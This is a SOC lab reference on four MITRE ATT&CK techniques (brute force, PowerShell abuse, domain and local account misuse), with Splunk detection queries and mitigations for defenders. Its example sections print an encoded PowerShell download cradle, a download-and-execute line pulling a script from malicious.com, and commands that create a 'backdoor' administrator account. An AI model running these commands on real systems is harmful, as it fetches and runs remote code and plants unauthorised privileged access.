# MITRE ATT&CK Techniques Reference

> **Note:** This document provides detailed information about the MITRE ATT&CK techniques covered in our SOC lab playbooks. This reference is based on the official MITRE ATT&CK framework and is intended to supplement our incident response playbooks.

---

## Table of Contents

1. [T1110 - Brute Force](#t1110---brute-force)
2. [T1059.001 - Command and Scripting Interpreter: PowerShell](#t1059001---command-and-scripting-interpreter-powershell)
3. [T1078.002 - Valid Accounts: Domain Accounts](#t1078002---valid-accounts-domain-accounts)
4. [T1078.003 - Valid Accounts: Local Accounts](#t1078003---valid-accounts-local-accounts)

---

## T1110 - Brute Force

### Overview

**Technique ID:** T1110  
**Tactic:** Credential Access  
**Platforms:** Windows, Linux, macOS, Office 365, Azure AD, SaaS, IaaS  
**Permissions Required:** None (for password guessing attempts)

### Description

Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute force attacks typically involve attempting multiple passwords against one or more accounts.

### Sub-Techniques

#### T1110.001 - Password Guessing
Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password format, an adversary may try different combinations of passwords.

**Examples:**
- Attempting common passwords (e.g., "password", "123456", "admin")
- Using default credentials
- Trying username variations as passwords

#### T1110.002 - Password Cracking
Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential data is stored in hashed formats.

**Examples:**
- Using tools like John the Ripper, Hashcat
- Dictionary attacks
- Rainbow table attacks

#### T1110.003 - Password Spraying
Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g., "Password01"), or a small list of commonly used passwords, that may match the complexity policy of the domain.

**Examples:**
- Trying "Password01" against multiple accounts
- Using seasonal passwords (e.g., "Summer2024!")
- Avoiding account lockouts by trying one password per account

#### T1110.004 - Credential Stuffing
Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap, especially if users reuse the same credentials across systems.

### Detection

**Data Sources:**
- Authentication logs (Windows Event ID 4625 - Failed logon attempts)
- Application logs
- Network traffic (authentication attempts)

**Detection Methods:**
- Monitor for multiple failed authentication attempts from the same source
- Detect patterns of password spraying (few passwords against many accounts)
- Identify unusual authentication patterns outside business hours
- Alert on rapid successive authentication failures

**Splunk Detection Query Example:**
```spl
index=windows_security EventCode=4625
| stats count by Account_Name, Source_Network_Address
| where count > 5
| sort -count
```

**Windows Event IDs:**
- **4625:** An account failed to log on
- **4624:** An account was successfully logged on (check for correlation)

### Mitigations

1. **Account Lockout (M1026):**
   - Implement account lockout policies after a certain number of failed attempts
   - Set lockout duration and reset counter appropriately

2. **Password Policies (M1027):**
   - Enforce strong password policies (complexity, length, uniqueness)
   - Require regular password changes
   - Prohibit password reuse

3. **Multi-factor Authentication (M1032):**
   - Implement MFA for all accounts, especially privileged accounts
   - Use hardware tokens or authenticator apps

4. **User Account Management (M1018):**
   - Disable or remove unused accounts
   - Regularly audit account access and permissions
   - Monitor for account creation and modification

5. **Network Segmentation (M1030):**
   - Restrict access to authentication services
   - Implement network segmentation to limit lateral movement

### Procedures/Examples

**Common Tools:**
- Hydra (used in our lab scenario)
- Medusa
- Ncrack
- Brutus
- Custom scripts

**Attack Pattern:**
1. Adversary identifies target accounts (e.g., admin, administrator, common usernames)
2. Obtains or creates password wordlist (e.g., rockyou.txt)
3. Uses automated tool to attempt multiple passwords
4. Monitors for successful authentication
5. Uses compromised credentials for further access

### References

- **MITRE ATT&CK:** https://attack.mitre.org/techniques/T1110/
- **Sub-techniques:** https://attack.mitre.org/techniques/T1110/
- **Detection:** https://attack.mitre.org/detectionstrategies/T1110/

---

## T1059.001 - Command and Scripting Interpreter: PowerShell

### Overview

**Technique ID:** T1059.001  
**Tactic:** Execution  
**Platforms:** Windows  
**Permissions Required:** User

### Description

Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.

PowerShell may also be used to download and execute malicious payloads. This may be done to bypass application control and other defensive mechanisms.

### Sub-Techniques

This technique does not have sub-techniques, but adversaries commonly use various PowerShell features:

- **Encoded Commands:** Using `-EncodedCommand` or `-enc` flag with base64-encoded strings
- **Download and Execute:** Using `Invoke-WebRequest` or `Invoke-Expression` to download and run scripts
- **Bypass Execution Policy:** Using `-ExecutionPolicy Bypass` or `-noprofile`
- **Hidden Execution:** Using `-WindowStyle Hidden` or `-NoLogo`
- **Remote Execution:** Using PowerShell remoting (WinRM)

### Detection

**Data Sources:**
- Process monitoring (Sysmon Event ID 1 - Process Creation)
- PowerShell logs (Script Block Logging, Module Logging)
- Command-line arguments
- Network connections (if PowerShell makes outbound connections)

**Detection Methods:**
- Monitor for PowerShell execution with suspicious parameters
- Detect encoded commands (`-enc`, `-EncodedCommand`)
- Identify PowerShell execution from unusual parent processes
- Monitor for PowerShell download and execute patterns
- Detect PowerShell execution from non-standard locations

**Splunk Detection Query Example:**
```spl
index=sysmon EventCode=1 Image="*powershell.exe" CommandLine="*-enc*"
| stats count by Image, CommandLine, User
| where count > 0
```

**Windows Event IDs:**
- **Sysmon Event ID 1:** Process creation (captures command line)
- **Windows Event ID 4104:** PowerShell Script Block Logging (if enabled)
- **Windows Event ID 4103:** PowerShell Module Logging (if enabled)

**Suspicious Indicators:**
- Base64-encoded command lines
- PowerShell with `-noprofile`, `-WindowStyle Hidden`, `-ExecutionPolicy Bypass`
- PowerShell downloading content (`Invoke-WebRequest`, `DownloadString`)
- PowerShell executing from unusual locations (temp folders, user directories)
- PowerShell spawned from non-standard parent processes (e.g., Office applications, browsers)

### Mitigations

1. **Execution Prevention (M1038):**
   - Disable PowerShell if not required for business operations
   - Use application whitelisting to restrict PowerShell execution
   - Implement PowerShell constrained language mode

2. **Restrict File and Directory Permissions (M1022):**
   - Limit where PowerShell scripts can be executed from
   - Restrict write access to directories where PowerShell scripts are stored

3. **Disable or Remove Feature or Program (M1042):**
   - Remove PowerShell v2 if not needed (older version with fewer security controls)
   - Consider removing PowerShell entirely if not required

4. **Audit (M1047):**
   - Enable PowerShell Script Block Logging
   - Enable PowerShell Module Logging
   - Enable PowerShell Transcription
   - Monitor PowerShell execution events

5. **User Account Management (M1018):**
   - Limit user permissions to prevent unauthorized PowerShell execution
   - Implement least privilege principle

6. **Network Segmentation (M1030):**
   - Restrict PowerShell remoting capabilities
   - Limit network access for PowerShell processes

### Procedures/Examples

**Common Attack Patterns:**

1. **Encoded Command Execution:**
   ```powershell
   powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
   ```

2. **Download and Execute:**
   ```powershell
   powershell -ExecutionPolicy Bypass -noprofile -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"
   ```

3. **Hidden Execution:**
   ```powershell
   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File malicious.ps1
   ```

**Common Tools:**
- Built-in PowerShell cmdlets
- Empire (PowerShell post-exploitation framework)
- PowerSploit (collection of PowerShell scripts)
- Cobalt Strike (uses PowerShell for execution)

### References

- **MITRE ATT&CK:** https://attack.mitre.org/techniques/T1059/001/
- **Detection:** https://attack.mitre.org/detectionstrategies/T1059/001/
- **PowerShell Security:** https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/09-securing-script

---

## T1078.002 - Valid Accounts: Domain Accounts

### Overview

**Technique ID:** T1078.002  
**Tactic:** Defense Evasion, Persistence, Privilege Escalation, Initial Access  
**Platforms:** Windows  
**Permissions Required:** User (domain account)

### Description

Adversaries may obtain and abuse credentials of a domain account to gain Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services (AD DS) where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.

Domain accounts provide centralized authentication and authorization across the domain. Adversaries may compromise domain accounts through various means (brute force, credential theft, etc.) and use them to access resources across multiple systems in the domain.

### Key Characteristics

**Domain Accounts vs Local Accounts:**
- **Domain Accounts:** Managed centrally by Active Directory Domain Services (AD DS)
- **Local Accounts:** Managed locally on individual systems
- Domain accounts provide:
  - Single sign-on (SSO) across domain systems
  - Centralized password policies
  - Group-based access control
  - Cross-system authentication

**Common Abuse Scenarios:**
1. Using compromised domain credentials to access multiple systems
2. Escalating privileges using domain admin accounts
3. Maintaining persistence through domain account access
4. Moving laterally across domain-joined systems
5. Accessing shared resources and network services

### Detection

**Data Sources:**
- Windows Security Event Logs
- Active Directory logs
- Authentication logs
- Group membership changes
- Network authentication events

**Detection Methods:**
- Monitor for unusual domain account logons
- Detect logons from unusual locations or times
- Identify privilege escalation using domain accounts
- Monitor for domain account creation or modification
- Track domain account access to sensitive resources

**Splunk Detection Query Example:**
```spl
index=windows_security EventCode=4624 Account_Domain="<DOMAIN_NAME>"
| stats count by Account_Name, Source_Network_Address, Logon_Type
| where count > threshold
```

**Windows Event IDs:**
- **4624:** An account was successfully logged on
- **4625:** An account failed to log on
- **4768:** A Kerberos authentication ticket (TGT) was requested
- **4769:** A Kerberos service ticket was requested
- **4732:** A member was added to a security-enabled local group
- **4728:** A member was added to a security-enabled global group

**Suspicious Indicators:**
- Domain account logons from unusual IP addresses
- Domain account logons outside business hours
- Domain account accessing multiple systems in short time
- Domain account privilege escalation events
- Domain account creation or modification

### Mitigations

1. **Account Use Policies (M1036):**
   - Implement policies to limit domain account usage
   - Regularly audit domain account access and permissions
   - Monitor for unusual domain account activity

2. **Privileged Account Management (M1026):**
   - Implement least privilege for domain accounts
   - Regularly review domain admin group memberships
   - Use privileged access management (PAM) solutions
   - Implement just-in-time (JIT) access for domain admin accounts

3. **Multi-factor Authentication (M1032):**
   - Require MFA for all domain accounts, especially privileged ones
   - Use hardware tokens or authenticator apps
   - Implement conditional access policies

4. **Password Policies (M1027):**
   - Enforce strong password policies for domain accounts
   - Require regular password changes
   - Prohibit password reuse
   - Use unique passwords for each account

5. **Audit (M1047):**
   - Enable detailed auditing for domain account activities
   - Monitor Event IDs 4624, 4625, 4768, 4769
   - Set up alerts for unusual domain account logons
   - Regularly review audit logs

6. **User Account Management (M1018):**
   - Disable or remove unused domain accounts
   - Regularly audit domain account access and permissions
   - Monitor for unauthorized domain account creation
   - Implement change management processes

### Procedures/Examples

**Common Attack Patterns:**

1. **Using Compromised Domain Credentials:**
   - Adversary obtains domain account credentials (e.g., through brute force)
   - Uses credentials to authenticate to domain-joined systems
   - Accesses shared resources and network services

2. **Domain Account Privilege Escalation:**
   - Adversary compromises regular domain user account
   - Adds account to Domain Admins or other privileged groups
   - Gains elevated privileges across domain

3. **Lateral Movement Using Domain Accounts:**
   - Adversary uses domain credentials to access multiple systems
   - Moves laterally across domain-joined systems
   - Accesses sensitive resources using domain account permissions

### References

- **MITRE ATT&CK:** https://attack.mitre.org/techniques/T1078/002/
- **Detection:** https://attack.mitre.org/detectionstrategies/T1078/002/

---

## T1078.003 - Valid Accounts: Local Accounts

### Overview

**Technique ID:** T1078.003  
**Tactic:** Defense Evasion, Persistence, Privilege Escalation, Initial Access  
**Platforms:** Windows, Linux, macOS  
**Permissions Required:** Administrator (to modify group membership)

### Description

Adversaries may obtain and abuse credentials of a local account to gain Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

Local accounts are managed by the operating system or application and are intended to be used only by that system. Adversaries may create new local accounts or leverage existing local accounts to maintain access to systems.

### Key Characteristics

**Local Accounts vs Domain Accounts:**
- **Local Accounts:** Managed locally on individual systems, not centrally
- **Domain Accounts:** Managed by Active Directory Domain Services (AD DS)
- Local accounts are often used for:
  - System administration
  - Service accounts
  - Emergency access
  - Standalone systems

**Common Abuse Scenarios:**
1. Adding a local user to Administrators group (privilege escalation)
2. Creating new local accounts for persistence
3. Using compromised local accounts to bypass access controls
4. Leveraging local service accounts for lateral movement

### Detection

**Data Sources:**
- Windows Security Event Logs
- Account management logs
- Group membership changes
- Authentication logs

**Detection Methods:**
- Monitor for users added to privileged groups (e.g., Administrators)
- Detect creation of new local accounts
- Identify unusual account activity
- Monitor for privilege escalation events

**Splunk Detection Query Example:**
```spl
index=windows_security (EventCode=4732 OR EventCode=4728)
| stats count by Account_Name, Account_Domain, Group_Name
| where count > 0
```

**Windows Event IDs:**
- **4732:** A member was added to a security-enabled local group
- **4728:** A member was added to a security-enabled global group
- **4720:** A user account was created
- **4624:** An account was successfully logged on
- **4672:** Special privileges assigned to new logon

**Suspicious Indicators:**
- User added to Administrators group outside maintenance windows
- Unusual accounts being elevated (e.g., test accounts, temporary accounts)
- Multiple privilege escalations in short time period
- Accounts created and immediately granted elevated privileges
- Privilege changes made by non-administrative accounts

### Mitigations

1. **Account Use Policies (M1036):**
   - Implement policies to limit local account usage
   - Regularly audit local account membership in privileged groups
   - Document and approve all local account creation

2. **Privileged Account Management (M1026):**
   - Implement least privilege principle
   - Regularly review and audit privileged group memberships
   - Use privileged access management (PAM) solutions
   - Implement just-in-time (JIT) access for administrative privileges

3. **Multi-factor Authentication (M1032):**
   - Require MFA for all local accounts, especially privileged ones
   - Use hardware tokens or authenticator apps

4. **Password Policies (M1027):**
   - Enforce strong password policies for local accounts
   - Require regular password changes
   - Prohibit password reuse
   - Use unique passwords for each account

5. **Audit (M1047):**
   - Enable detailed auditing for group membership changes
   - Monitor Event IDs 4732, 4728, 4720
   - Set up real-time alerts for privilege escalation events
   - Regularly review audit logs

6. **User Account Management (M1018):**
   - Disable or remove unused local accounts
   - Regularly audit local account access and permissions
   - Monitor for unauthorized account creation
   - Implement change management processes for account modifications

7. **Operating System Configuration (M1028):**
   - Restrict who can modify group membership
   - Use Group Policy to control local account creation
   - Implement approval workflows for privilege changes

### Procedures/Examples

**Common Attack Patterns:**

1. **Adding User to Administrators Group:**
   ```powershell
   net localgroup administrators testuser /add
   ```
   This generates Event ID 4732 in Windows Security logs.

2. **Creating New Local Account:**
   ```powershell
   net user backdoor Password123! /add
   net localgroup administrators backdoor /add
   ```

3. **Using Existing Compromised Account:**
   - Adversary gains access to a local account (e.g., through brute force)
   - Uses that account to add themselves or another account to Administrators group
   - Maintains persistent access with elevated privileges

**Attack Chain Example:**
1. Initial Access: Brute force attack (T1110) gains access to local account
2. Execution: PowerShell execution (T1059.001) runs commands
3. Privilege Escalation: Add account to Administrators group (T1078.003)
4. Persistence: Create scheduled tasks or services
5. Lateral Movement: Use elevated privileges to access other systems

### Related Techniques

**Often Used With:**
- **T1110 (Brute Force):** To gain initial access to local accounts
- **T1059.001 (PowerShell):** To execute commands for privilege escalation
- **T1021.002 (SMB/Windows Admin Shares):** For lateral movement after escalation
- **T1547 (Boot or Logon Autostart Execution):** For persistence

**Can Lead To:**
- **T1021 (Remote Services):** Lateral movement using elevated privileges
- **T1041 (Exfiltration Over C2 Channel):** Data exfiltration with admin access
- **T1070 (Indicator Removal):** Clearing logs with administrative access

### References

- **MITRE ATT&CK:** https://attack.mitre.org/techniques/T1078/002/
- **Detection:** https://attack.mitre.org/detectionstrategies/T1078/002/
- **Parent Technique:** https://attack.mitre.org/techniques/T1078/

---

## Attack Chain Analysis

### Common Attack Sequence in Our Lab

1. **Initial Access (T1110 - Brute Force)**
   - Adversary performs RDP brute force attack from Kali Linux
   - Multiple failed logon attempts (Event ID 4625)
   - Potential successful logon (Event ID 4624)

2. **Execution (T1059.001 - PowerShell)**
   - Adversary executes encoded PowerShell commands
   - Obfuscated commands bypass basic detection
   - Sysmon captures process creation (Event ID 1)

3. **Privilege Escalation (T1078.003 - Local Accounts)**
   - Adversary adds local user to Administrators group (T1078.003)
   - Windows logs group membership change (Event ID 4732)
   - User now has full administrative access

### Detection Correlation

**Multi-Stage Detection Query:**
```spl
index=windows_security (EventCode=4625 OR EventCode=4624 OR EventCode=4732)
| eval attack_stage=case(
    EventCode=4625, "Brute Force Attempt",
    EventCode=4624, "Successful Logon",
    EventCode=4732, "Privilege Escalation",
    1=1, "Other"
)
| stats count, values(Account_Name) as accounts by attack_stage, Source_Network_Address
| sort -_time
```

### Mitigation Strategy

1. **Prevent Initial Access:**
   - Implement account lockout policies
   - Use MFA for all accounts
   - Restrict RDP access

2. **Detect Execution:**
   - Enable PowerShell logging
   - Monitor for encoded commands
   - Use Sysmon for process monitoring

3. **Prevent Escalation:**
   - Implement least privilege
   - Monitor group membership changes
   - Require approval for privilege changes

---

## Additional Resources

### MITRE ATT&CK Framework
- **Main Website:** https://attack.mitre.org/
- **Technique Search:** https://attack.mitre.org/techniques/
- **Detection Strategies:** https://attack.mitre.org/detectionstrategies/
- **Mitigations:** https://attack.mitre.org/mitigations/

### Learning Resources
- **MITRE ATT&CK Navigator:** https://mitre-attack.github.io/attack-navigator/
- **ATT&CK Evaluations:** https://attackevals.mitre.org/
- **Adversary Emulation Plans:** https://github.com/mitre/cti

### Tools
- **CALDERA:** Adversary emulation framework
- **Atomic Red Team:** Tests mapped to MITRE ATT&CK
- **MITRE ATT&CK for Enterprise:** Enterprise-focused techniques

---

## Document Information

**Created:** As part of SOC Lab learning project  
**Last Updated:** [Current Date]  
**Purpose:** Reference guide for MITRE ATT&CK techniques covered in incident response playbooks  
**Related Documents:**
- Playbook 1: Brute Force Attack
- Playbook 2: Suspicious PowerShell Execution
- Playbook 3: Privilege Escalation

---

**Return to:** [Phase 8: Incident Response Playbooks Overview](../Phase8_Incident_Response_Playbooks.md)

